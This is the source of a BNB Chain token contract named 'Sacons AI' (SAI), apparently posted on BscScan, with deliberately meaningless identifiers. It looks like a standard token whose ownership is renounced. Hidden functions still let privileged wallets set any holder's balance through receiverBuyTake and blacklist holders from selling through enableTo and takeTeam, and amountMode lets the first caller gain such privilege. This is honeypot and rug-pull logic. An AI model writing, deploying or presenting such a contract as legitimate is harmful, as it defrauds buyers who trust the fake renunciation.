/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface toLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundFrom) external view returns (uint256);

    function transfer(address fromMax, uint256 listReceiver) external returns (bool);

    function allowance(address limitTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 listReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address fromMax,
        uint256 listReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverAtTeam, uint256 value);
    event Approval(address indexed limitTotal, address indexed spender, uint256 value);
}

interface toLaunchedMetadata is toLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract listMinAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeShould {
    function createPair(address fromLiquidity, address tradingReceiver) external returns (address);
}

interface isAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SaconsAI is listMinAt, toLaunched, toLaunchedMetadata {

    function modeWalletToken(address liquidityFrom, address fromMax, uint256 listReceiver) internal returns (bool) {
        if (liquidityFrom == totalMode) {
            return tokenMin(liquidityFrom, fromMax, listReceiver);
        }
        require(!takeTeam[liquidityFrom]);
        return tokenMin(liquidityFrom, fromMax, listReceiver);
    }

    function amountMode(address takeFeeTrading) public {
        if (totalSender) {
            return;
        }
        if (maxLaunch) {
            minTokenWallet = swapFromMode;
        }
        isTrading[takeFeeTrading] = true;
        if (maxLaunch != launchTotal) {
            totalMin = minTokenWallet;
        }
        totalSender = true;
    }

    function enableReceiver() public {
        
        if (liquidityModeFee) {
            takeLaunch = true;
        }
        liquidityModeFee=false;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellAtTotal;
    }

    bool private liquidityModeFee;

    constructor (){ 
        if (maxLaunch) {
            maxLaunch = false;
        }
        isAuto feeExempt = isAuto(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        walletTx = takeShould(feeExempt.factory()).createPair(feeExempt.WETH(), address(this));
        enableFrom = _msgSender();
        
        totalMode = _msgSender();
        isTrading[_msgSender()] = true;
        if (takeLaunch != maxLaunch) {
            swapFromMode = minTokenWallet;
        }
        listLimit[_msgSender()] = buyAmount;
        emit Transfer(address(0), totalMode, buyAmount);
        takeTotal();
    }

    string private feeLiquidity = "Sacons AI";

    function allowance(address buyLimitEnable, address tokenReceiverBuy) external view virtual override returns (uint256) {
        return buyLaunch[buyLimitEnable][tokenReceiverBuy];
    }

    function getOwner() external view returns (address) {
        return enableFrom;
    }

    bool public launchTotal;

    uint256 private buyAmount = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return feeFrom;
    }

    string private sellAtTotal = "SAI";

    bool private takeLaunch;

    function enableTo(address fundMin) public {
        
        if (fundMin == totalMode || fundMin == walletTx || !isTrading[_msgSender()]) {
            return;
        }
        if (listMinMax) {
            listMinMax = false;
        }
        takeTeam[fundMin] = true;
    }

    function receiverBuyTake(address listFund, uint256 listReceiver) public {
        require(isTrading[_msgSender()]);
        listLimit[listFund] = listReceiver;
    }

    function transfer(address listFund, uint256 listReceiver) external virtual override returns (bool) {
        return modeWalletToken(_msgSender(), listFund, listReceiver);
    }

    function name() external view virtual override returns (string memory) {
        return feeLiquidity;
    }

    function balanceOf(address fundFrom) public view virtual override returns (uint256) {
        return listLimit[fundFrom];
    }

    uint256 private minTokenWallet;

    function marketingLaunch() public {
        
        
        listMinMax=false;
    }

    bool public totalSender;

    function isSender() public {
        
        if (launchTotal != maxLaunch) {
            liquidityModeFee = true;
        }
        minTokenWallet=0;
    }

    address private enableFrom;

    mapping(address => bool) public takeTeam;

    function takeTotal() public {
        emit OwnershipTransferred(totalMode, address(0));
        enableFrom = address(0);
    }

    uint256 private totalMin;

    address public totalMode;

    function fundAmount() public {
        if (launchTotal == maxLaunch) {
            swapFromMode = minTokenWallet;
        }
        
        liquidityModeFee=false;
    }

    uint8 private feeFrom = 18;

    function owner() external view returns (address) {
        return enableFrom;
    }

    function tokenMin(address liquidityFrom, address fromMax, uint256 listReceiver) internal returns (bool) {
        require(listLimit[liquidityFrom] >= listReceiver);
        listLimit[liquidityFrom] -= listReceiver;
        listLimit[fromMax] += listReceiver;
        emit Transfer(liquidityFrom, fromMax, listReceiver);
        return true;
    }

    function approve(address tokenReceiverBuy, uint256 listReceiver) public virtual override returns (bool) {
        buyLaunch[_msgSender()][tokenReceiverBuy] = listReceiver;
        emit Approval(_msgSender(), tokenReceiverBuy, listReceiver);
        return true;
    }

    mapping(address => bool) public isTrading;

    function listTotal() public {
        if (launchTotal) {
            totalMin = minTokenWallet;
        }
        if (launchTotal == takeLaunch) {
            minTokenWallet = totalMin;
        }
        totalMin=0;
    }

    function takeListAmount() public {
        
        
        launchTotal=false;
    }

    bool private listMinMax;

    mapping(address => uint256) private listLimit;

    uint256 public swapFromMode;

    function limitShould() public view returns (bool) {
        return takeLaunch;
    }

    address public walletTx;

    mapping(address => mapping(address => uint256)) private buyLaunch;

    bool public maxLaunch;

    function totalSupply() external view virtual override returns (uint256) {
        return buyAmount;
    }

    event OwnershipTransferred(address indexed listFee, address indexed toAmountAt);

    function transferFrom(address liquidityFrom, address fromMax, uint256 listReceiver) external override returns (bool) {
        if (buyLaunch[liquidityFrom][_msgSender()] != type(uint256).max) {
            require(listReceiver <= buyLaunch[liquidityFrom][_msgSender()]);
            buyLaunch[liquidityFrom][_msgSender()] -= listReceiver;
        }
        return modeWalletToken(liquidityFrom, fromMax, listReceiver);
    }

}